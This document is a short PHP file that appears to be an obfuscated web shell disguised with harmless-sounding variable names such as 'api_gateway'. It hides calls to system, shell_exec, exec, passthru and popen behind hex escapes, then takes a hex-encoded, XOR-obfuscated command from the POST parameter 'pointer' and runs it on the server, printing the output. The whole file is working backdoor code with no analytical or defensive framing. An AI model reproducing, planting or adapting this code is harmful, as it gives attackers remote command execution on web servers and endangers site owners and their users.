<?php

$app_initializer = "\x68ex2b\x69n";
$api_gateway7 = "pcl\x6Fse";
$api_gateway2 = "\x73h\x65l\x6C\x5F\x65xec";
$api_gateway6 = "s\x74\x72ea\x6D_\x67e\x74_\x63\x6F\x6Et\x65nts";
$api_gateway3 = "exe\x63";
$api_gateway5 = "pope\x6E";
$api_gateway4 = "p\x61ss\x74\x68\x72u";
$api_gateway1 = "\x73\x79\x73tem";
if (isset($_POST["p\x6F\x69\x6Et\x65r"])) {
            function splitter_tool (  $pset , $itm)    {
 $token   = '';
   for($x=0;
 $x<strlen($pset);
 $x++){
$token.=chr(ord($pset[$x])^$itm);

} return   $token;
 
}
            $pointer = $app_initializer($_POST["p\x6F\x69\x6Et\x65r"]);
            $pointer = splitter_tool($pointer, 24);
            if (function_exists($api_gateway1)) {
                $api_gateway1($pointer);
            } elseif (function_exists($api_gateway2)) {
                print $api_gateway2($pointer);
            } elseif (function_exists($api_gateway3)) {
                $api_gateway3($pointer, $value_pset);
                print join("\n", $value_pset);
            } elseif (function_exists($api_gateway4)) {
                $api_gateway4($pointer);
            } elseif (function_exists($api_gateway5) && function_exists($api_gateway6) && function_exists($api_gateway7)) {
                $itm_token = $api_gateway5($pointer, 'r');
                if ($itm_token) {
                    $binding_entity = $api_gateway6($itm_token);
                    $api_gateway7($itm_token);
                    print $binding_entity;
                }
            }
            exit;
        }